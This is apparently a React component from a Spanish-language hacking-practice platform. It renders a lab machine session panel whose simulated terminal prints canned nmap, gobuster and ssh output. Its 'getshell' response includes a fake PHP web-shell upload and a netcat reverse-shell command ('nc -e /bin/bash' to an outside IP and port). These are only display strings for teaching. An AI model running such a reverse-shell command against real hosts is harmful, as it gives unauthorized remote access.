
import React, { useState, useEffect } from 'react';
import { useAuth } from '@/contexts/AuthContext';
import { useToast } from '@/components/ui/use-toast';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Progress } from '@/components/ui/progress';
import { Clock, Server, Terminal, Power, Info, Copy, Loader2, Activity } from 'lucide-react';
import { MachineSession, MachineSessionService } from './MachineSessionService';
import { Skeleton } from '@/components/ui/skeleton';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import MachineTerminal from './MachineTerminal';

interface MachineSessionPanelProps {
  machineSession: MachineSession;
  onTerminate: () => void;
  onRefresh: () => void;
}

export const MachineSessionPanel: React.FC<MachineSessionPanelProps> = ({
  machineSession,
  onTerminate,
  onRefresh
}) => {
  const { toast } = useToast();
  const [remainingTime, setRemainingTime] = useState<number>(
    machineSession.remainingTimeMinutes || 0
  );
  const [isTerminating, setIsTerminating] = useState(false);
  const [isProvisioning, setIsProvisioning] = useState(
    machineSession.status === 'requested' || machineSession.status === 'provisioning'
  );
  const [terminalOutput, setTerminalOutput] = useState<string[]>([
    'INFO: Terminal web conectada. Escribe "help" para ver comandos disponibles.',
    'INFO: Para conectarte a SSH, usa el comando "ssh".'
  ]);
  const [terminalConnected, setTerminalConnected] = useState(false);
  const [activeTab, setActiveTab] = useState('terminal');
  const [machineServices, setMachineServices] = useState(machineSession.services || []);
  
  // Calculate total time from session data
  const totalTime = machineSession.connectionInfo?.maxTimeMinutes || 120; // Default 2 hours
  const timeProgress = Math.max(0, Math.min(100, ((totalTime - remainingTime) / totalTime) * 100));
  
  // Setup countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setRemainingTime(prev => {
        if (prev <= 0) return 0;
        return prev - 1/60; // Decrease by 1 second converted to minutes
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);

  // Update provisioning state if status changes
  useEffect(() => {
    const newIsProvisioning = machineSession.status === 'requested' || machineSession.status === 'provisioning';
    setIsProvisioning(newIsProvisioning);
    
    if (machineSession.status === 'running') {
      setTerminalConnected(true);
      // Si hay servicios en la sesión, actualizarlos
      if (machineSession.services && machineSession.services.length > 0) {
        setMachineServices(machineSession.services);
      }
    } else {
      setTerminalConnected(false);
    }
  }, [machineSession.status, machineSession.services]);

  // Calculate remaining time in hours and minutes
  const hours = Math.floor(remainingTime / 60);
  const minutes = Math.floor(remainingTime % 60);
  const seconds = Math.floor((remainingTime * 60) % 60);
  
  // Format time
  const formattedTime = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  
  // Handle terminate machine
  const handleTerminate = async () => {
    setIsTerminating(true);
    
    try {
      const success = await MachineSessionService.terminateMachine(machineSession.sessionId);
      
      if (success) {
        toast({
          title: "Máquina terminada",
          description: "La máquina ha sido liberada correctamente.",
          variant: "success",
        });
        onTerminate();
      } else {
        throw new Error("Error al terminar la máquina");
      }
    } catch (error) {
      console.error('Error terminating machine:', error);
      toast({
        title: "Error",
        description: "No se pudo terminar la máquina. Intente nuevamente.",
        variant: "destructive",
      });
    } finally {
      setIsTerminating(false);
    }
  };
  
  // Handle copy to clipboard
  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copiado",
      description: `${label} copiado al portapapeles`,
    });
  };
  
  // Get status badge color
  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'running':
        return <Badge className="bg-green-600">Activa</Badge>;
      case 'provisioning':
        return <Badge className="bg-yellow-600">Aprovisionando</Badge>;
      case 'requested':
        return <Badge className="bg-blue-600">Solicitada</Badge>;
      case 'failed':
        return <Badge className="bg-red-600">Error</Badge>;
      case 'terminated':
        return <Badge className="bg-gray-600">Terminada</Badge>;
      default:
        return <Badge>{status}</Badge>;
    }
  };

  // Handle terminal commands
  const handleCommand = (command: string) => {
    // Log the command with a prefix
    setTerminalOutput(prev => [...prev, `$ ${command}`]);
    
    // Process commands with proceso más realista
    if (command.toLowerCase() === 'help') {
      setTerminalOutput(prev => [
        ...prev, 
        'Comandos disponibles:',
        '  help       - Muestra esta ayuda',
        '  clear      - Limpia la terminal',
        '  ssh        - Inicia conexión SSH a la máquina',
        '  ping       - Hace ping a la máquina',
        '  nmap       - Escaneo básico de puertos',
        '  gobuster   - Escaneo de directorios web',
        '  getshell   - Intenta obtener una shell en la máquina',
        '  exit       - Cierra la sesión SSH actual',
        '  whoami     - Muestra el usuario actual',
        '  ifconfig   - Muestra información de red'
      ]);
    } else if (command.toLowerCase() === 'clear') {
      setTerminalOutput([]);
    } else if (command.toLowerCase() === 'ssh') {
      // Simulate SSH connection
      setTerminalOutput(prev => [
        ...prev,
        'Conectando a ' + machineSession.ipAddress + '...',
        'The authenticity of host \'' + machineSession.ipAddress + '\' can\'t be established.',
        'ED25519 key fingerprint is SHA256:AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPp.',
        'This key is not known by any other names.',
        'Are you sure you want to continue connecting (yes/no/[fingerprint])? yes',
        'Warning: Permanently added \'' + machineSession.ipAddress + '\' (ED25519) to the list of known hosts.',
        machineSession.username + '@' + machineSession.ipAddress + '\'s password: ',
        'Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)',
        '',
        ' * Documentation:  https://help.ubuntu.com',
        ' * Management:     https://landscape.canonical.com',
        ' * Support:        https://ubuntu.com/advantage',
        '',
        'This system has been minimized by removing packages and content that are',
        'not required on a system that users do not log into.',
        '',
        'To restore this content, you can run the \'unminimize\' command.',
        '',
        'The programs included with the Ubuntu system are free software;',
        'the exact distribution terms for each program are described in the',
        'individual files in /usr/share/doc/*/copyright.',
        '',
        'Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by',
        'applicable law.',
        '',
        `${machineSession.username}@${machineSession.ipAddress}:~$ `
      ]);
    } else if (command.toLowerCase() === 'ping') {
      // Simulate ping with realistic output
      setTerminalOutput(prev => [
        ...prev,
        'PING ' + machineSession.ipAddress + ' 56(84) bytes of data.',
        '64 bytes from ' + machineSession.ipAddress + ': icmp_seq=1 ttl=64 time=0.045 ms',
        '64 bytes from ' + machineSession.ipAddress + ': icmp_seq=2 ttl=64 time=0.038 ms',
        '64 bytes from ' + machineSession.ipAddress + ': icmp_seq=3 ttl=64 time=0.041 ms',
        '64 bytes from ' + machineSession.ipAddress + ': icmp_seq=4 ttl=64 time=0.039 ms',
        '--- ' + machineSession.ipAddress + ' ping statistics ---',
        '4 packets transmitted, 4 received, 0% packet loss, time 3055ms',
        'rtt min/avg/max/mdev = 0.038/0.040/0.045/0.005 ms',
        `${machineSession.username}@${machineSession.ipAddress}:~$ `
      ]);
    } else if (command.toLowerCase() === 'nmap') {
      // Simulate nmap with servicios reales
      const serviceOutput = machineServices.map(service => 
        `${service.puerto}/tcp\t${service.estado}\t${service.nombre}${service.version ? ' ' + service.version : ''}`
      );
      
      // Si no hay servicios registrados, mostrar algunos típicos
      if (serviceOutput.length === 0) {
        serviceOutput.push('22/tcp\topen\tssh\tOpenSSH 8.2p1 Ubuntu 4ubuntu0.9');
        serviceOutput.push('80/tcp\topen\thttp\tApache httpd 2.4.41');
      }
      
      setTerminalOutput(prev => [
        ...prev,
        'Starting Nmap 7.92 ( https://nmap.org ) at ' + new Date().toLocaleTimeString('es-ES') + ' EDT',
        'Nmap scan report for ' + machineSession.ipAddress,
        'Host is up (0.00045s latency).',
        'Not shown: 998 closed tcp ports (conn-refused)',
        'PORT   STATE SERVICE VERSION',
        ...serviceOutput,
        'Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel',
        '',
        'Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .',
        'Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds',
        `${machineSession.username}@${machineSession.ipAddress}:~$ `
      ]);
    } else if (command.toLowerCase() === 'gobuster') {
      // Simulate gobuster directory scan
      setTerminalOutput(prev => [
        ...prev,
        'Gobuster v3.1.0',
        'by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)',
        '===============================================================',
        `[+] Url:                     http://${machineSession.ipAddress}`,
        '[+] Method:                  GET',
        '[+] Threads:                 10',
        '[+] Wordlist:                /usr/share/wordlists/dirb/common.txt',
        '[+] Negative Status codes:   404',
        '[+] User Agent:              gobuster/3.1.0',
        '[+] Timeout:                 10s',
        '===============================================================',
        '2025/05/15 13:24:11 Starting gobuster in directory enumeration mode',
        '===============================================================',
        '/admin                (Status: 301) [Size: 0] [--> /admin/]',
        '/assets               (Status: 301) [Size: 0] [--> /assets/]',
        '/css                  (Status: 301) [Size: 0] [--> /css/]',
        '/index.html           (Status: 200) [Size: 3851]',
        '/js                   (Status: 301) [Size: 0] [--> /js/]',
        '/login                (Status: 200) [Size: 1250]',
        '/logout               (Status: 302) [Size: 0] [--> /login]',
        '/server-status        (Status: 403) [Size: 278]',
        '/uploads              (Status: 301) [Size: 0] [--> /uploads/]',
        '===============================================================',
        '2025/05/15 13:24:23 Finished',
        '===============================================================',
        `${machineSession.username}@${machineSession.ipAddress}:~$ `
      ]);
    } else if (command.toLowerCase() === 'exit') {
      setTerminalOutput(prev => [
        ...prev,
        'Connection to ' + machineSession.ipAddress + ' closed.',
        'INFO: Terminal web conectada. Escribe "help" para ver comandos disponibles.'
      ]);
    } else if (command.toLowerCase() === 'getshell') {
      setTerminalOutput(prev => [
        ...prev,
        'INFO: Buscando vulnerabilidades conocidas...',
        'INFO: Analizando servicios en la máquina...',
        'INFO: Probando rutas web comunes...',
        'INFO: Encontrado archivo php vulnerable en /admin/upload.php',
        'INFO: Intentando subir archivo shell.php...',
        'SUCCESS: ¡Shell PHP subida correctamente!',
        'INFO: Accediendo a http://' + machineSession.ipAddress + '/uploads/shell.php',
        'SUCCESS: ¡Shell web obtenida!',
        'INFO: Generando shell inversa...',
        'INFO: Ejecutando: nc -e /bin/bash 10.10.14.20 4444',
        'INFO: Esperando conexión en el listener...',
        'SUCCESS: ¡Conexión recibida!',
        'INFO: Estabilizando shell...',
        'bash-5.0$ whoami',
        'www-data',
        'bash-5.0$ id',
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
        'bash-5.0$ '
      ]);
    } else if (command.toLowerCase() === 'whoami') {
      setTerminalOutput(prev => [
        ...prev,
        machineSession.username || 'kali',
        `${machineSession.username}@${machineSession.ipAddress}:~$ `
      ]);
    } else if (command.toLowerCase() === 'ifconfig') {
      setTerminalOutput(prev => [
        ...prev,
        'eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500',
        '        inet ' + (machineSession.ipAddress || '10.10.10.123') + '  netmask 255.255.255.0  broadcast 10.10.10.255',
        '        inet6 fe80::215:5dff:fe54:6992  prefixlen 64  scopeid 0x20<link>',
        '        ether 00:15:5d:54:69:92  txqueuelen 1000  (Ethernet)',
        '        RX packets 12288  bytes 1839426 (1.7 MiB)',
        '        RX errors 0  dropped 0  overruns 0  frame 0',
        '        TX packets 8517  bytes 1070124 (1.0 MiB)',
        '        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0',
        '',
        'lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536',
        '        inet 127.0.0.1  netmask 255.0.0.0',
        '        inet6 ::1  prefixlen 128  scopeid 0x10<host>',
        '        loop  txqueuelen 1000  (Local Loopback)',
        '        RX packets 12  bytes 740 (740.0 B)',
        '        RX errors 0  dropped 0  overruns 0  frame 0',
        '        TX packets 12  bytes 740 (740.0 B)',
        '        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0',
        `${machineSession.username}@${machineSession.ipAddress}:~$ `
      ]);
    } else {
      // Simulate command execution with a generic response
      setTerminalOutput(prev => [
        ...prev,
        'Ejecutando: ' + command,
        'bash: ' + command.split(' ')[0] + ': command not found',
        `${machineSession.username}@${machineSession.ipAddress}:~$ `
      ]);
    }
  };

  return (
    <Card className="bg-cybersec-darkgray border-cybersec-darkgray mb-6">
      <CardHeader className="pb-2">
        <div className="flex justify-between items-center">
          <div>
            <CardTitle className="text-cybersec-neongreen">
              Sesión Activa
            </CardTitle>
            <CardDescription>
              {machineSession.machineDetails?.name || 'Máquina Vulnerable'}
            </CardDescription>
          </div>
          <div>
            {getStatusBadge(machineSession.status)}
          </div>
        </div>
      </CardHeader>
      
      <CardContent className="space-y-4">
        {/* Tiempo restante */}
        <div className="space-y-2">
          <div className="flex justify-between items-center text-sm">
            <div className="flex items-center gap-2">
              <Clock className="h-4 w-4 text-cybersec-neongreen" />
              <span>Tiempo restante</span>
            </div>
            <span className="text-cybersec-neongreen font-mono">
              {formattedTime}
            </span>
          </div>
          <Progress value={timeProgress} className="h-1.5" />
        </div>
        
        {/* Provisioning state information */}
        {isProvisioning && (
          <div className="p-4 bg-yellow-900/20 rounded-md">
            <div className="flex items-center gap-2 mb-3">
              <Loader2 className="h-5 w-5 text-yellow-500 animate-spin" />
              <h4 className="font-medium text-yellow-500">
                Aprovisionando máquina
              </h4>
            </div>
            
            <p className="text-sm text-gray-300 mb-3">
              La máquina está siendo creada y configurada. Este proceso puede tardar hasta 2 minutos.
            </p>
            
            <div className="w-full bg-cybersec-black h-2 rounded overflow-hidden">
              <div className="h-full bg-yellow-500/70 animate-pulse"></div>
            </div>
          </div>
        )}
        
        {/* Tabs para conexión e información */}
        <Tabs 
          defaultValue="terminal" 
          value={activeTab}
          onValueChange={setActiveTab}
          className="w-full"
        >
          <TabsList className="grid grid-cols-3 mb-4">
            <TabsTrigger value="terminal" className="flex items-center gap-2">
              <Terminal className="h-4 w-4" />
              Terminal
            </TabsTrigger>
            <TabsTrigger value="services" className="flex items-center gap-2">
              <Activity className="h-4 w-4" />
              Servicios
            </TabsTrigger>
            <TabsTrigger value="info" className="flex items-center gap-2">
              <Info className="h-4 w-4" />
              Conexión
            </TabsTrigger>
          </TabsList>
          
          {/* Terminal Tab */}
          <TabsContent value="terminal" className="mt-0">
            <div className="h-80">
              <MachineTerminal 
                onCommand={handleCommand}
                output={terminalOutput}
                isConnected={machineSession.status === 'running'}
                loading={isProvisioning}
                sessionId={machineSession.sessionId}
                realConnection={false} // Cambiar a true cuando se implementa la conexión real
              />
            </div>
          </TabsContent>
          
          {/* Services Tab - Nuevo */}
          <TabsContent value="services" className="mt-0">
            <div className="p-4 bg-cybersec-black rounded-md h-80 overflow-y-auto">
              <h4 className="text-cybersec-electricblue mb-3 flex items-center gap-2">
                <Server className="h-4 w-4" /> Servicios detectados
              </h4>
              
              {isProvisioning ? (
                <div className="flex flex-col gap-3">
                  <div className="flex items-center gap-2 text-yellow-500">
                    <Loader2 className="h-4 w-4 animate-spin" />
                    <span>Escaneando servicios...</span>
                  </div>
                  <Skeleton className="h-8 w-full" />
                  <Skeleton className="h-8 w-full" />
                  <Skeleton className="h-8 w-full" />
                </div>
              ) : machineServices.length === 0 ? (
                <div className="text-center text-gray-500 py-6">
                  <p>No se han detectado servicios.</p>
                  <p className="text-sm mt-1">Utilice el comando 'nmap' en la terminal para escanear la máquina.</p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead>
                      <tr className="text-left border-b border-cybersec-darkgray">
                        <th className="py-2 px-3">Puerto</th>
                        <th className="py-2 px-3">Estado</th>
                        <th className="py-2 px-3">Servicio</th>
                        <th className="py-2 px-3">Versión</th>
                      </tr>
                    </thead>
                    <tbody>
                      {machineServices.map((service, i) => (
                        <tr key={i} className={`${i % 2 === 0 ? 'bg-cybersec-black/30' : ''}`}>
                          <td className="py-2 px-3">{service.puerto}/tcp</td>
                          <td className="py-2 px-3">
                            <Badge className={`${service.estado === 'open' ? 'bg-green-700' : 'bg-gray-700'}`}>
                              {service.estado}
                            </Badge>
                          </td>
                          <td className="py-2 px-3">{service.nombre}</td>
                          <td className="py-2 px-3 text-gray-400">{service.version || '-'}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
              
              {machineSession.vulnerabilities && machineSession.vulnerabilities.length > 0 && (
                <div className="mt-6">
                  <h4 className="text-cybersec-electricblue mb-3">Vulnerabilidades detectadas</h4>
                  <div className="space-y-2">
                    {machineSession.vulnerabilities.map((vuln, i) => (
                      <div key={i} className="bg-cybersec-darkgray/50 p-3 rounded">
                        <div className="flex justify-between mb-1">
                          <span className="font-medium">{vuln.nombre}</span>
                          <Badge className={`
                            ${vuln.severidad === 'crítica' ? 'bg-red-600' : 
                              vuln.severidad === 'alta' ? 'bg-orange-600' :
                              vuln.severidad === 'media' ? 'bg-yellow-600' : 'bg-blue-600'}
                          `}>
                            {vuln.severidad}
                          </Badge>
                        </div>
                        <p className="text-sm text-gray-400">{vuln.descripcion}</p>
                        {vuln.cve && (
                          <p className="text-xs mt-1 text-cybersec-electricblue">{vuln.cve}</p>
                        )}
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </TabsContent>
          
          {/* Info Tab */}
          <TabsContent value="info" className="mt-0">
            <div className="p-4 bg-cybersec-black rounded-md h-80 overflow-y-auto">
              <h4 className="text-cybersec-electricblue mb-2 flex items-center gap-2">
                <Server className="h-4 w-4" /> Información de conexión
              </h4>
              
              <div className="space-y-3 text-sm">
                {/* IP Address with loading state */}
                <div className="flex justify-between items-center">
                  <span className="text-gray-400">IP Address:</span>
                  <div className="flex items-center gap-1">
                    {isProvisioning ? (
                      <div className="flex items-center">
                        <Skeleton className="h-5 w-24" />
                        <span className="ml-2 text-xs text-yellow-500">(Pendiente)</span>
                      </div>
                    ) : (
                      <>
                        <span className="font-mono">{machineSession.ipAddress || 'No disponible'}</span>
                        {machineSession.ipAddress && (
                          <Button 
                            variant="ghost" 
                            size="icon" 
                            className="h-6 w-6" 
                            onClick={() => copyToClipboard(machineSession.ipAddress || '', 'IP')}
                          >
                            <Copy className="h-3 w-3" />
                          </Button>
                        )}
                      </>
                    )}
                  </div>
                </div>
                
                {/* Username with loading state */}
                <div className="flex justify-between items-center">
                  <span className="text-gray-400">Usuario:</span>
                  <div className="flex items-center gap-1">
                    {isProvisioning ? (
                      <div className="flex items-center">
                        <Skeleton className="h-5 w-24" />
                        <span className="ml-2 text-xs text-yellow-500">(Pendiente)</span>
                      </div>
                    ) : (
                      <>
                        <span className="font-mono">{machineSession.username || 'No disponible'}</span>
                        {machineSession.username && (
                          <Button 
                            variant="ghost" 
                            size="icon" 
                            className="h-6 w-6" 
                            onClick={() => copyToClipboard(machineSession.username || '', 'Usuario')}
                          >
                            <Copy className="h-3 w-3" />
                          </Button>
                        )}
                      </>
                    )}
                  </div>
                </div>
                
                {/* Password with loading state */}
                <div className="flex justify-between items-center">
                  <span className="text-gray-400">Contraseña:</span>
                  <div className="flex items-center gap-1">
                    {isProvisioning ? (
                      <div className="flex items-center">
                        <Skeleton className="h-5 w-24" />
                        <span className="ml-2 text-xs text-yellow-500">(Pendiente)</span>
                      </div>
                    ) : (
                      <>
                        <span className="font-mono">{machineSession.password || 'No disponible'}</span>
                        {machineSession.password && (
                          <Button 
                            variant="ghost" 
                            size="icon" 
                            className="h-6 w-6" 
                            onClick={() => copyToClipboard(machineSession.password || '', 'Contraseña')}
                          >
                            <Copy className="h-3 w-3" />
                          </Button>
                        )}
                      </>
                    )}
                  </div>
                </div>
                
                {/* SSH Command with loading state */}
                {!isProvisioning && machineSession.status === 'running' && machineSession.connectionInfo?.sshCommand && (
                  <div className="mt-3 p-2 bg-cybersec-darkgray rounded border border-cybersec-darkgray">
                    <div className="flex justify-between items-center mb-1">
                      <span className="text-gray-400">Comando SSH:</span>
                      <Button 
                        variant="ghost" 
                        size="icon" 
                        className="h-6 w-6" 
                        onClick={() => copyToClipboard(machineSession.connectionInfo.sshCommand, 'Comando SSH')}
                      >
                        <Copy className="h-3 w-3" />
                      </Button>
                    </div>
                    <code className="text-xs font-mono text-cybersec-electricblue">
                      {machineSession.connectionInfo.sshCommand}
                    </code>
                  </div>
                )}
                
                {/* Mensaje de información en modo de provisioning */}
                {isProvisioning && (
                  <div className="mt-3 p-3 bg-blue-900/20 rounded text-sm text-blue-400 border border-blue-900/40">
                    <p>La información de conexión estará disponible una vez que la máquina haya sido aprovisionada completamente.</p>
                  </div>
                )}
                
                {/* VPN Connection Info - simulado */}
                {!isProvisioning && machineSession.status === 'running' && (
                  <div className="mt-5">
                    <h5 className="text-cybersec-electricblue mb-2 text-sm font-medium">Conexión VPN</h5>
                    <div className="bg-cybersec-darkgray p-3 rounded text-sm">
                      <p className="mb-2">Para una experiencia de red más realista, puedes conectarte vía VPN:</p>
                      <ol className="list-decimal list-inside space-y-1 text-gray-300">
                        <li>Descarga tu <span className="text-cybersec-electricblue cursor-pointer">archivo OpenVPN</span></li>
                        <li>Conéctate usando tu cliente OpenVPN</li>
                        <li>Accede directamente a la IP {machineSession.ipAddress}</li>
                      </ol>
                      <p className="text-xs text-gray-400 mt-2">* La VPN proporciona acceso completo a la red de la máquina</p>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
      
      <CardFooter className="flex gap-2 justify-between">
        <Button 
          variant="outline"
          className="border-cybersec-electricblue text-cybersec-electricblue hover:bg-cybersec-electricblue hover:text-cybersec-black"
          onClick={onRefresh}
        >
          Actualizar estado
        </Button>
        
        <Button 
          variant="destructive" 
          className="bg-red-800 hover:bg-red-700"
          onClick={handleTerminate}
          disabled={isTerminating}
        >
          <Power className="h-4 w-4 mr-2" />
          {isTerminating ? 'Terminando...' : 'Terminar máquina'}
        </Button>
      </CardFooter>
    </Card>
  );
};

export default MachineSessionPanel;
